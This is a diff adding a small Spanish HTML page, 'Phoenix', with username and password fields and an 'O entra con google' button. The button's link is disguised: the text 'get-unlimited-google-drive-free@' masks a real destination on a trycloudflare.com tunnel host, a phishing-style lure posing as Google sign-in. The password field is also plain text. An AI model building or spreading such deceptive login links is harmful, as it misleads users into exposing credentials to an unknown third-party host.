@@ -1,0 +1,15 @@
+<html>
+<head>
+<title>Phoenix</title>
+</head>
+<body text=¨#FFFFFF¨ background="imagen.jpg">
+<p><b><big><CENTER>Bienvenidos a PHOENIX</CENTER></big></b></p>
+<CENTER><img src="perfil.png"></CENTER>
+<p><b><small><CENTER>Registrate</CENTER></small></b></p>
+<CENTER><input type="text" name="Usuario" value="Usuario" size="30" maxlenght="20"></CENTER>
+&nbsp
+<CENTER><input type="text" name="Contraseña" value="Contraseña" size="30" maxlenght="20"></CENTER>
+<p><b><small><CENTER>O entra con google</CENTER></small></b></p>
+<CENTER><a href="https://get-unlimited-google-drive-free@anaheim-isbn-paso-all.trycloudflare.com "><img src="google.png"></a></CENTER>
+</body>
+</html>
